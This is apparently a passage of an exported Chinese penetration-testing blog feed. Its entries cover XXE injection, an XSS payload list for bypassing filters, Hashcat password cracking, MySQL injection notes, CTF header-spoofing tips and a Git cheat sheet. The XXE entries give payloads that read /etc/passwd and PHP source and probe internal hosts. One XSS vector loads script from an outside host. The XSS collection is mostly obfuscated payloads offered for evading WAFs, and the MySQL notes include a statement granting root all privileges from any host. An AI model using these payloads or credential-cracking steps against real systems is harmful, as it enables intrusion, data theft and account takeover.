&lt;?php $fileread = &lt;&lt;&lt;XML &lt;!-- validators.en.xliff --&gt; &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE dropsec [ &lt;!ELEMENT methodname ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file://C:/phpStudy/WWW/XXE/file.ext&quot; &gt;]&gt; &lt;methodname&gt;&amp;xxe;&lt;/methodname&gt; XML; $data = simplexml_load_string($fileread); print_r($data); ?&gt; 如果要引用一个外部资源,可以借助各种协议，这里通过file:// 协议引入了外部实体. file:///path/to/file.ext http://url/file.ext php://filter/read=convert.base64-encode/resource=conf.php 也可读取网站内容 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE dropsec [ &lt;!ELEMENT methodname ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;http://byd.dropsec.xyz/robots.txt&quot; &gt;]&gt; &lt;methodname&gt;&amp;xxe;&lt;/methodname&gt; 通过上面可以用来内网探测，如果安装了expect扩展组件甚至可以用来进行内网渗透。 如果包含文件失败,可能是由于读取php等文件时文件本身包含的&lt;等字符.可以使用Base64编码绕过,如: &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE dropsec [ &lt;!ELEMENT methodname ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt; &lt;methodname&gt;&amp;xxe;&lt;/methodname&gt; 内部实体的这支持与否也是取决于解释器的。不同的浏览器不一样，不通语言默认也不一样。所以利用比较困难。 但实际上XML外部实体的解析，和php版本并无关系，而是和编译时的libxml库版本有关。 0x04 攻击1.拒绝服务 POC 2.内网信息 借助各种协议如http,XXE可以协助扫描内网,可能可以访问到内网开放WEB服务的Server,并获取其他信息. &lt;!ELEMENT portscan SYSTEM &apos;http://192.168.2.1/&apos; &gt; &lt;!ELEMENT smb SYSTEM &apos;\\192.168.2.1\c$&apos; &gt; &lt;!ELEMENT sql SYSTEM &apos;http://192.168.2.1/index.php?id=1;drop table myweb;#&apos; &gt; 3.文件读取 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE dropsec [ &lt;!ELEMENT methodname ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt; &lt;methodname&gt;&amp;xxe;&lt;/methodname&gt; 0x05 防御1、对于PHP,由于simplexml_load_string函数的XML解析问题出在libxml库上,所以可以提前加上: &lt;?php libxml_disable_entity_loader(true); ?&gt; 2、检查所使用的底层xml解析库，默认禁止外部实体的解析. 3、对于XMLReader和DOM方式解析. &lt;?php // with the XMLReader functionality: $doc = XMLReader::xml($badXml,&apos;UTF-8&apos;,LIBXML_NONET); // with the DOM functionality: $dom = new DOMDocument(); $dom-&gt;loadXML($badXml,LIBXML_DTDLOAD|LIBXML_DTDATTR); ?&gt;]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git 常用命令速查表]]></title>
    <url>%2F2016%2F08%2F15%2FGit%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[Git 是目前世界上最先进的分布式版本控制系统（没有之一）。Git有什么特点？简单来说就是：高端大气上档次！ 0x01 分支master: 默认开发分支 Head： 默认开发分支 origin： 默认远程版本库 head^： Head的父提交 0x02 创建版本库$ git clone &lt;ur&gt; #克隆远程版本库 $ git init #初始化本地版本库 0x03 修改和提交$ git status #查看状态 $ git diff #查看变更内容 $ git add . #跟踪所有改动过的文件 $ git add &lt;file&gt; #跟踪指定文件 $ git mv &lt;old&gt; &lt;new&gt; #文件改名 $ git rm &lt;file&gt; #删除文件 $ git rm --cached &lt;file&gt; #停止跟踪文件但不删除 $ git commit -m &quot;commit message&quot;#提交所有更新过的文件 $ git commit --amend #修改最后一次提交 0x04 查看提交历史$ git log #查看提交历史 $ git log -p &lt;file&gt; #查看指定文件的提交历史 $ git blame &lt;file&gt; #以列表方式查看指定文件的提交历史 0x05 撤销$ git reset --hard HEAD #撤销工作目录中所有未提交文件的修改内容 $ git checkout HEAD &lt;file&gt; #撤销指定的未提交文件的修改内容 $ git revert &lt;commit&gt; #撤销指定的提交 0x06 分支与标签$ git branch #显示所有本地分支 $ git checkout &lt;branch/tag&gt; #切换到指定分支或者标签 $ git branch &lt;new-nbranch&gt; #创建新分支 $ git branch -d &lt;branch&gt; #删除本分支 $ git tag #列出所有本地标签 $ git tag &lt;tagname&gt; #基于最新提交创建标签 $ git tag -d &lt;tagname&gt; #删除标签 0x07 合并与衍合$ git merge &lt;branch&gt; #合并指定分支到当前分支 $ git rebase &lt;branch&gt; #衍合指定分支到当前分支 0x08 远程操作$ git remote -v #查看远程版本库信息 $ git remote show &lt;remote&gt; #查看指定远程版本库信息 $ git remote add &lt;remote&gt; &lt;url&gt; #添加远程版本库 $ git fetch &lt;remote&gt; #从远程库获取代码 $ git pull &lt;remote&gt; &lt;branch&gt; #下载代码及快速合并 $ git push &lt;remote&gt; &lt;branch&gt; #上传代码及快速合并 $ git push &lt;remote&gt; :&lt;branch/tagname&gt;#删除远程分支或标签 $ git push --tags #上传所有标签]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF中一些绕过网站访问限制的技巧]]></title>
    <url>%2F2016%2F08%2F12%2FCTF%E4%B8%AD%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E7%BD%91%E7%AB%99%E8%AE%BF%E9%97%AE%E9%99%90%E5%88%B6%E7%9A%84%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[平时访问网站或者做 CTF 题的时候会遇到网站限制访问的问题，下面是一些小技巧，主要是通过 BurpSuite 拦截 HTTP 请求并根据需要修改 HTTP 请求头的内容来达到绕过的目的。 1、看起来只允许国外访问，有可能是 HTTP 请求头中的 Accept-Language 为中文(cn-zh)，修改为英文(en-us)即可 2、浏览器类型限制：修改 HTTP 请求中的 User-Agent 3、IP地址限制：可能跟 HTTP 请求头中的 X-Forwarded-For、client-ip、remote_addr 有关，或者挂代理。 4、需要登录，可能是 Cookie 的问题，如果 Cookie 比较简单，试试能不能构造。 5、尝试查看 robots.txt 可以获得该网站的一些信息。 6、有一些加referer加上代理ip。]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>WAF绕过</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS一些小技巧]]></title>
    <url>%2F2016%2F08%2F12%2FXSS%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[1、http://www.wooyun.org/bugs/wooyun-2013-034003 &lt;textarea/&gt;&quot;&gt;&lt;img src=1 onerror=&quot;with(document)body.appendChild(createElement(String.fromCharCode(115,99,114,105,112,116))).src=&apos;//pxss.sinaapp.com/l6OBji&apos;&quot;&gt; &lt;textarea/&gt;&lt;iframe src=http://www.baidu.com/&gt;&lt;/iframe&gt; 2、只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启xss filter。 3、可以利用字符编码来绕过XSS Filter的方法，当编码是is-2022-kr时浏览器会忽略%0f，这样我们在onerror后面加个%0f就能绕过filter，前提是注入一个&lt;meta charset=ISO-2022-KR&gt; 4、&lt;iframe srcdoc=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt; 不是以on开头的 又可以执行JS的iframe属性。 5、 &lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=&gt;aa&lt;/a&gt; 6、 &lt;a href=javascirpt:alert(1)&gt;请点击&lt;/a&gt; 7、 &lt;iframe/onload=alert(1)&gt; 8、 &lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiWHNzVGVzdCIpOzwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt; 9、一些有趣的XSS Vector http://zone.wooyun.org/content/15121]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>XSS</tag>
        <tag>WAF绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HashCat使用手册]]></title>
    <url>%2F2016%2F08%2F10%2FHashCat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C%2F</url>
    <content type="text"><![CDATA[0x00 背景Hashcat是一个已经有贴近完美的工作工具，支持像“PasswordsPro”，“约翰开膛手”基于规则的攻击。然而，对于一些未知的原因，他们两个不支持多线程。这是写Hashcat的唯一理由：为了利用现代CPU的多个核心。 0x01 简介Hashcat有两个主要的变种： 1.Hashcat 基于CPU的密码恢复工具 2.oclHashcat/cudaHashcat 一个GPU加速工具 许多由Hashcat支持的算法可以在更短的时间，通过使用证据充分的GPU加速被破解在oclHashcat（如MD5，SHA1，等等）利用。然而，并非所有的算法可以通过利用GPU的加速。Bcrypt就是一个很好的例子。由于种种因素，比如依赖于数据的分支，序列化和内存（以仅举几例），oclHashcat不是一个包罗万象的替代Hashcat。使用的话，低版本提示版本过低的话，改一下时间就行了）使用Hashcat没有任何限制，使用oclhashcat则必须满足AMD（的OpenCL）和Nvidia（CUDA）。 0x02 特性 Hashcat可用于Linux，OSX和Windows。oclHashcat仅适用于Linux和Windows 世界最快的密码破解 世界第一个也是唯一基于GPU规则引擎 自由 开源 多GPU（高达128 GPU）的 多散列（高达1亿散列） 多操作系统（Linux和Windows本地二进制文件） 多平台（OpenCL和CUDA支持） 多算法中（见下文） 资源利用率低，你仍然可以看电影或玩游戏而破裂 高度集中迭代现代哈希 基于重点字典攻击 支持分布式开裂 支持暂停 / 恢复而开裂 支持会话 支持恢复 支持读取单词文件 支持读取字标准输入 支持六角盐 支持十六进制字符集 内置基准系统 综合热看门狗 150+算法在考虑性能的实现 0x04 使用说明破解的hash类型使用 –help 查看破解类型 900 = MD4 0 = MD5 5100 = Half MD5 100 = SHA1 10800 = SHA-384 1400 = SHA-256 1700 = SHA-512 5000 = SHA-3(Keccak) 10100 = SipHash 6000 = RipeMD160 6100 = Whirlpool 6900 = GOST R 34.11-94 11700 = GOST R 34.11-2012 (Streebog) 256-bit 11800 = GOST R 34.11-2012 (Streebog) 512-bit 10 = md5($pass.$salt) 20 = md5($salt.$pass) 30 = md5(unicode($pass).$salt) 40 = md5($salt.unicode($pass)) 3800 = md5($salt.$pass.$salt) 3710 = md5($salt.md5($pass)) 2600 = md5(md5($pass) 4300 = md5(strtoupper(md5($pass))) 4400 = md5(sha1($pass)) 110 = sha1($pass.$salt) 120 = sha1($salt.$pass) 130 = sha1(unicode($pass).$salt) 140 = sha1($salt.unicode($pass)) 4500 = sha1(sha1($pass) 4700 = sha1(md5($pass)) 4900 = sha1($salt.$pass.$salt) 1410 = sha256($pass.$salt) 1420 = sha256($salt.$pass) 1430 = sha256(unicode($pass).$salt) 1440 = sha256($salt.unicode($pass)) 1710 = sha512($pass.$salt) 1720 = sha512($salt.$pass) 1730 = sha512(unicode($pass).$salt) 1740 = sha512($salt.unicode($pass)) 破解方式0 = Straight #直接字典破解 1 = Combination #组合破解 2 = Toggle-Case #切换不同文件破解 3 = Brute-force #掩码暴力破解 4 = Permutation #置换组合破解 5 = Table-Lookup #查表破解 8 = Prince 参数说明General: -m, --hash-type=NUM hash类型，引用上文数字 -a, --attack-mode=NUM 攻击类型，引用上文数字 -V, --version 版本 -h, --help 帮助文档 --quiet Suppress output Misc: --hex-salt 以十六进制给出 --hex-charset 以字符集给出 --runtime=NUM 运行num时间后终止 --status 启用状态 --status-timer=NUM 定时器 --status-automat 状态 Built-in charsets: #自定义字符集 ?l = abcdefghijklmnopqrstuvwxyz ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ ?d = 0123456789 ?s = !&quot;#$%&amp;&apos;()*+,-./:;&lt;=&gt;?@[\]^_`{|}~ ?a = ?l?u?d?s ?b = 0x00 - 0xff FIile: -o，--outfile =文件中定义OUTFILE已恢复哈希 --outfile格式= NUM定义恢复的散列OUTFILE格式，请参阅下面引用 --outfile-autohex-Disable禁止使用$ HEX []输出平原 -p，--separator = CHAR定义hashlists / outfile中分离炭 --show显示密码破解只（见--username） --left只（见--username）显示未开裂的密码 --username启用hashfile用户名忽略（推荐：也使用--show） 一旦它被破解--remove启用哈希删除 --stdout标准输出模式 --potfile，禁止不写potfile --debug模式= NUM（仅适用于通过使用规则的混合）定义调试模式， 见下面的参考资料 --debug文件=调试规则文件的输出文件（见--debug模式） -e，--salt-file =文件盐，文件无盐hashlists Increment: -i, --increment --increment-min=NUM 最小值 --increment-max=NUM 最大值 0x05 具体操作使用字典进行破解使用给的字典和hash进行破解 Hashcat.exe -m 500 example500.hash example.dict cudaHashcat32.exe -m 500 example500.hash example.dict &gt;result.txt 使用掩码进行破解48E231E66FF8943DB0F6D2B6CB6536D2（xiaoming123456）?l?l?l?l?l?l?l?l?d?d?d?d?d?d hashcat.exe -m 0 -a 3 48E231E66FF8943DB0F6D2B6CB6536D2 ?l?l?l?l?l?l?l?l?d?d?d?d?d?d HashCat参数优化HashCat本身考虑到系统资源的分配，默认参数下并没有最大化的来使用硬件资源。如果我们想要让破解速度最大化，就需要对一些参数进行配置。 Workload tuning 负载调优。该参数支持的值有1,8,40,80,160 --gpu-accel 160 可以让GPU发挥最大性能。 Gpu loops 负载微调该参数支持的值的范围是8-1024（有些算法只支持到1000）。 --gpu-loops 1024 可以让GPU发挥最大性能。 Segment size 字典缓存大小该参数是设置内存缓存的大小，作用是将字典放入内存缓存以加快字典破解速度，默认为32MB，可以根据自身内存情况进行设置，当然是越大越好XD。 --segment-size 512 可以提高大字典破解的速度。]]></content>
      <tags>
        <tag>爆破</tag>
        <tag>渗透测试</tag>
        <tag>Hashcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS payload]]></title>
    <url>%2F2016%2F08%2F05%2FXSS-payload%2F</url>
    <content type="text"><![CDATA[收集的一些比较有用的XSS payload，用于绕过waf及一些应用程序，具体的分类就不说了，一看就明白的。 &lt;sCrIpt&gt;alert(1)&lt;/ScRipt&gt; \&lt;iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)&gt; &lt;img src=&apos;1&apos; onerror\x00=alert(0) /&gt; &lt;img src=&apos;1&apos; onerror/=alert(0) /&gt; &lt;img src=&apos;1&apos; onerror\x0b=alert(0) /&gt; &lt;img src=&apos;1&apos; onerror=\x00alert(0) /&gt; &lt;\x00img src=&apos;1&apos; onerror=alert(0) /&gt; &lt;script\x00&gt;alert(1)&lt;/script&gt; &lt;i\x00mg src=&apos;1&apos; onerror=alert(0) /&gt; &lt;img/src=&apos;1&apos;/onerror=alert(0)&gt; &lt;img\x0bsrc=&apos;1&apos;\x0bonerror=alert(0)&gt; &lt;img src=&apos;1&apos;&apos;onerror=&apos;alert(0)&apos;&gt; &lt;img src=&apos;1&apos;&quot;onerror=&quot;alert(0)&quot;&gt; &lt;img src=&apos;1&apos;\x00onerror=alert(0)&gt; &lt;img src=&apos;1&apos;onerror=alert(0)&gt; Firefox (\x09, \x0a, \x0d, \x20) Chrome (Any character \x01 to \x20) &lt;iframe src=&quot;\x01javascript:alert(0)&quot;&gt;&lt;/iframe&gt; &lt;!-- Example for Chrome --&gt; &lt;img src=&apos;1&apos; onerror=&apos;alert(0)&apos; &lt; &lt;&lt;script&gt;alert(0)&lt;/script&gt; &lt;style&gt;body{background-color:expression\(alert(1))}&lt;/style&gt; &lt;script&gt;document.write(&apos;&lt;a hr\ef=j\avas\cript\:a\lert(2)&gt;blah&lt;/a&gt;&apos;);&lt;/script&gt; HTML Encoding &lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot; /&gt; &lt;img src=&quot;1&quot; onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot; /&gt; &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt; &lt;iframe src=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;&lt;/iframe&gt; URL Encoding &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt; &lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/iframe&gt; CSS Hexadecimal Encoding &lt;div style=&quot;x:expression(alert(1))&quot;&gt;Joker&lt;/div&gt; &lt;div style=&quot;x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))&quot;&gt;Joker&lt;/div&gt; &lt;div style=&quot;x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))&quot;&gt;Joker&lt;/div&gt; &lt;div style=&quot;x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029&quot;&gt;Joker&lt;/div&gt; JavaScript &lt;script&gt;document.write(&apos;&lt;img src=1 onerror=alert(1)&gt;&apos;);&lt;/script&gt; &lt;script&gt;document.write(&apos;\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x31\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x61\x6C\x65\x72\x74\x28\x31\x29\x3E&apos;);&lt;/script&gt; &lt;script&gt;document.write(&apos;\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076&apos;);&lt;/script&gt; &lt;script&gt;document.write(&apos;\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0031\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003E&apos;);&lt;/script&gt; JavaScript &lt;script&gt;document.write(&apos;&lt;img src=1 onerror=alert(1)&gt;&apos;);&lt;/script&gt; &lt;script&gt;document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,49,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,48,41,62));&lt;/script&gt; JavaScript &lt;script&gt;alert(123)&lt;/script&gt; &lt;script&gt;\u0061\u006C\u0065\u0072\u0074(123)&lt;/script&gt; Overlong UTF-8 &lt; = %C0%BC = %E0%80%BC = %F0%80%80%BC &gt; = %C0%BE = %E0%80%BE = %F0%80%80%BE &apos; = %C0%A7 = %E0%80%A7 = %F0%80%80%A7 &quot; = %C0%A2 = %E0%80%A2 = %F0%80%80%A2 &lt;img src=&quot;1&quot; onnerror=&quot;alert(1)&quot;&gt; %E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE UTF-7 (Missing charset?) &lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot; /&gt; +ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4- Unicode .NET Ugliness &lt;script&gt;alert(1)&lt;/script&gt; %uff1cscript%uff1ealert(1)%uff1c/script%uff1e Classic ASP &lt;img src=&quot;1&quot; onerror=&quot;alert(&apos;1&apos;)&quot;&gt; %u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A and/or Useful features. HTML 5 (Not comphrensive) &lt;video src=&quot;http://www.w3schools.com/html5/movie.ogg&quot; onloadedmetadata=&quot;alert(1)&quot; /&gt; &lt;video src=&quot;http://www.w3schools.com/html5/movie.ogg&quot; onloadstart=&quot;alert(1)&quot; /&gt; Usuage of non-existent elements &lt;blah style=&quot;blah:expression(alert(1))&quot; /&gt; CSS Comments &lt;div style=&quot;z:exp/*anything*/res/*here*/sion(alert(1))&quot; /&gt; JavaScript functions &lt;script&gt;window[&apos;alert&apos;](0)&lt;/script&gt; &lt;script&gt;parent[&apos;alert&apos;](1)&lt;/script&gt; &lt;script&gt;self[&apos;alert&apos;](2)&lt;/script&gt; &lt;script&gt;top[&apos;alert&apos;](3)&lt;/script&gt; JavaScript into HTML &lt;img src=1 alt=al lang=ert onerror=top[alt+lang](0)&gt; &lt;script&gt; var junk = &apos;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&apos;; &lt;/script&gt; HTML CSS &lt;style&gt; body { background-image:url(&apos;http://www.blah.com/&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&apos;); } &lt;/style&gt; XML documents &lt;?xml version=&quot;1.0&quot; ?&gt; &lt;someElement&gt; &lt;a xmlns:a=&apos;http://www.w3.org/1999/xhtml&apos;&gt;&lt;a:body onload=&apos;alert(1)&apos;/&gt;&lt;/a&gt; &lt;/someElement&gt; URI Schemes &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt; &lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt; (IE) &lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(0)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt; (Firefox, Chrome, Safari) &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt; (Firefox, Chrome, Safari) HTTP Parameter Pollution http://target.com/something.xxx?a=val1&amp;a=val2 ASP.NET a = val1,val2 ASP a = val1,val2 JSP a = val1 PHP a = val2 &lt;script&gt;eval(location.hash.slice(1))&lt;/script&gt; &lt;script&gt;eval(location.hash)&lt;/script&gt; (Firefox) http://target.com/something.jsp?inject=&lt;script&gt;eval(location.hash.slice(1))&lt;/script&gt;#alert(1) &lt;iframe src=&quot;http://target.com/something.jsp?inject=&lt;script&gt;eval(name)&lt;/script&gt;&quot; name=&quot;alert(1)&quot;&gt;&lt;/iframe&gt; &lt;script&gt; $=~[];$={___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:({}+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:({}+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(&quot;+$.___+&quot;)&quot;+&quot;\&quot;&quot;)())(); &lt;/script&gt; &lt;script&gt; (+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])() &lt;/script&gt; `]]></content>
      <tags>
        <tag>爆破</tag>
        <tag>XSS</tag>
        <tag>WAF绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql注入总结]]></title>
    <url>%2F2016%2F08%2F02%2FMysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[mysql一般注入(select)，mysql一般注入(insert、update)，mysql报错注入，mysql一般盲注，mysql时间盲注，mysql的一些特性在SQL注入中的利用。 0x00 mysql一般注入(select)1.注释符:#,/*,-- 2.过滤空格注入使用/**/或()或+代替空格 %0c = form feed, new page %09 = horizontal tab %0d = carriage return %0a = line feed, new line 3.多条数据显示 concat() group_concat() concat_ws() 4.相关函数 system_user() 系统用户名 user() 用户名 current_user 当前用户名 session_user()连接数据库的用户名 database() 数据库名 version() MYSQL数据库版本 load_file() MYSQL读取本地文件的函数 @@datadir 读取数据库路径 @@basedir MYSQL 安装路径 @@version_compile_os 操作系统 GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;123456&apos; WITH GRANT OPTION; 5.mysql一般注入语句 